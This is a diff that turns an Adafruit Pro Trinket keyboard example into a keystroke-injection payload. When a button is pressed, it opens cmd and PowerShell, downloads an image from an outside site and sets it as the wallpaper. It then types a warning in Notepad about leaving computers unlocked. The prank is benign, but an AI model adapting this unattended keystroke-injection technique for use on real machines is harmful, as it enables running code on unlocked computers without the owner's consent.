@@ -1,47 +1,196 @@
 /*
-TrinketKeyboard example
-For Trinket by Adafruit Industries
+ProTrinketKeyboard example
+For Pro Trinket (ATmega328 based Trinket) by Adafruit Industries
+Please use library TrinketKeyboard for the ATtiny85 based Trinket
+Version 1.0  2015-01-01 Initial Version derived from TrinketKeyBoardExample  Mike Barela
 */
- 
-#include <TrinketKeyboard.h>
- 
-#define PIN_BUTTON_CAPITAL_A 0
-#define PIN_BUTTON_STRING    2
- 
+
+#include <ProTrinketKeyboard.h>  // Ensure the library is installed
+
+// Switches are connected from ground to these defined pins
+const int PIN_BUTTON_CAPITAL_A = 12;
+const int PIN_BUTTON_STRING    = 11;
+
 void setup()
 {
-  // button pins as inputs
+  // Declare button pins as inputs
   pinMode(PIN_BUTTON_CAPITAL_A, INPUT);
-  pinMode(PIN_BUTTON_STRING, INPUT);
- 
+  pinMode(PIN_BUTTON_STRING,    INPUT);
+
   // setting input pins to high means turning on internal pull-up resistors
   digitalWrite(PIN_BUTTON_CAPITAL_A, HIGH);
-  digitalWrite(PIN_BUTTON_STRING, HIGH);
+  digitalWrite(PIN_BUTTON_STRING,    HIGH);
   // remember, the buttons are active-low, they read LOW when they are not pressed
- 
+
   // start USB stuff
   TrinketKeyboard.begin();
 }
- 
+
 void loop()
 {
+  TrinketKeyboard.poll();
   // the poll function must be called at least once every 10 ms
   // or cause a keystroke
   // if it is not, then the computer may think that the device
   // has stopped working, and give errors
-  TrinketKeyboard.poll();
- 
+
   if (digitalRead(PIN_BUTTON_CAPITAL_A) == LOW)
   {
-    // this should type a capital A
-    TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_SHIFT, KEYCODE_A);
-    // this releases the key (otherwise it is held down!)
+        TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_GUI, KEYCODE_M);
+    // this should type a winkey M to hide windows 
     TrinketKeyboard.pressKey(0, 0);
-  }
+    // this releases the key
+    TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_GUI, KEYCODE_R);
+    // this should type a winkey R or RUN command
+    TrinketKeyboard.pressKey(0, 0);
+    // this releases the key
+
+    TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_GUI, KEYCODE_R);                  // Open the Run dialog.
+    TrinketKeyboard.pressKey(0, 0);
+
+    
+    delay(300);
  
+    TrinketKeyboard.print("cmd.exe");  // Start CMD small with dark text.
+    TrinketKeyboard.pressKey(KEYCODE_TAB, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+    
+    delay(300);                                                   // Give CMD some time to appear.
+    
+
+                                                                   // The next line sets the Powershell path based on our architecture.
+   TrinketKeyboard.print("if exist C:\\Windows\\SysWOW64 ( set PWRSHLXDD=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell) else ( set PWRSHLXDD=powershell )");
+    
+     TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+    
+    delay(500);    
+    
+   TrinketKeyboard.print("%PWRSHLXDD%");
+    TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+    delay(100);
+       TrinketKeyboard.print("Import-Module BitsTransfer");
+    TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+    delay(100);
+   TrinketKeyboard.print("Start-BitsTransfer -Source http://wallpapercave.com/wp/BHQNq3f.jpg  -Destination 'Downloads'");
+    TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+    delay(100);
+   TrinketKeyboard.print("$setwallpapersource = @\"");
+       TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+   // delay(100);
+      TrinketKeyboard.print("using System.Runtime.InteropServices;");
+          TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+  //  delay(100);
+         TrinketKeyboard.print("public class wallpaper");
+             TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+  //  delay(100);
+            TrinketKeyboard.print("{");
+                TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+   // delay(100);
+               TrinketKeyboard.print("public const int SetDesktopWallpaper = 20;");
+                   TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+   // delay(100);
+                  TrinketKeyboard.print("public const int UpdateIniFile = 0x01;");
+                      TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+   // delay(100);
+                     TrinketKeyboard.print("public const int SendWinIniChange = 0x02;");
+                         TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+ //   delay(100);
+                        TrinketKeyboard.print("[DllImport(\"user32.dll\", SetLastError = true, CharSet = CharSet.Auto)]");
+                            TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+   // delay(100);
+                           TrinketKeyboard.print("private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);");
+                               TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+  //  delay(100);
+                              TrinketKeyboard.print("public static void SetWallpaper ( string path )");
+                                  TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+   // delay(100);
+                                 TrinketKeyboard.print("{");
+                                     TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+   // delay(100);
+                                    TrinketKeyboard.print("SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );");
+                                        TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+   // delay(100);
+                                       TrinketKeyboard.print("}");
+                                           TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+   // delay(100);
+                                          TrinketKeyboard.print("}");
+                                              TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+  //  delay(100);
+                                             TrinketKeyboard.print("\"@");
+                                                 TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+
+   // delay(100);
+                                                TrinketKeyboard.print("Add-Type -TypeDefinition $setwallpapersource");
+                                                    TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+    // delay(100);
+                                      TrinketKeyboard.print("[wallpaper]::SetWallpaper(\"Downloads\\BHQNq3f.jpg\")");
+                                         
+
+                                                
+
+    TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+    TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+
+         TrinketKeyboard.print("Exit");
+   TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+          TrinketKeyboard.print("Exit");
+   TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+
+        TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_GUI, KEYCODE_R);
+    // this should type a winkey R or RUN command
+    TrinketKeyboard.pressKey(0, 0);
+    // this releases the key
+
+    TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_GUI, KEYCODE_R);                  // Open the Run dialog.
+    TrinketKeyboard.pressKey(0, 0);
+
+    
+    delay(300);
+ 
+    TrinketKeyboard.print("notepad.exe");  // Start CMD small with dark text.
+    TrinketKeyboard.pressKey(KEYCODE_TAB, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+    
+    delay(300);                                                   // Give CMD some time to appear.
+
+           TrinketKeyboard.print("You shouldn't leave your computer unlocked. Someone with ill intent could do more than change your background. Press Windows Key + L to lock your screen.");
+                                                    TrinketKeyboard.pressKey(KEYCODE_ENTER, KEYCODE_ENTER);
+    TrinketKeyboard.pressKey(0, 0);
+ 
+    delay(100);
+  }
+
+
+
   if (digitalRead(PIN_BUTTON_STRING) == LOW)
   {
     // type out a string using the Print class
-    TrinketKeyboard.print("Hello World!");
+    TrinketKeyboard.print("Hello World! ");
   }
 }
+cenatop.txtOpen
+Displaying cenatop.txt.
